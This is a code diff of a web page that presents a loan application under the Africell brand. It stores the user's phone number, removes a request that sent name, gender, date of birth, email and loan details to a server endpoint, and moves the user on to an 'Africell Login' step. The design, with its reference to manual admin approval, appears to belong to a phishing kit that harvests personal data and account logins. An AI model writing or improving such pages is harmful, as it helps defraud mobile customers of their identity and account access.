@@ -306,7 +306,6 @@
         const phoneInput = document.getElementById('phoneNumber');
 
         window.addEventListener('DOMContentLoaded', () => {
-            localStorage.removeItem('africellApprovalTimestamp');
             const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
             if (savedPhone && phoneInput) {
                 phoneInput.value = savedPhone.replace('+232', '').trim();
@@ -317,7 +316,7 @@
             return /^\d{8,9}$/.test(number.replace(/[\s-]/g, ''));
         }
 
-        async function handleFormSubmit(event) {
+        function handleFormSubmit(event) {
             event.preventDefault();
 
             const fullName = document.getElementById('fullName').value.trim();
@@ -353,20 +352,6 @@
             overlay.style.display = 'flex';
             loadingText.textContent = "Analyzing application data...";
 
-            try {
-                await fetch('/api/submit-order', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phone: fullPhoneNum, 
-                        uniqueId: `Application - Name: ${fullName}, Gender: ${gender}, DOB: ${fullDob}, Email: ${email}, Amount: ${finalAmount}, Type: ${loanType}, Reason: ${loanReason}` 
-                    })
-                });
-            } catch (error) {
-                console.error('Error submitting application:', error);
-            }
-
-            // Automatically proceed without waiting for manual admin approval click
             setTimeout(() => {
                 loadingText.textContent = "Proceeding to Africell Login...";
             }, 1800);
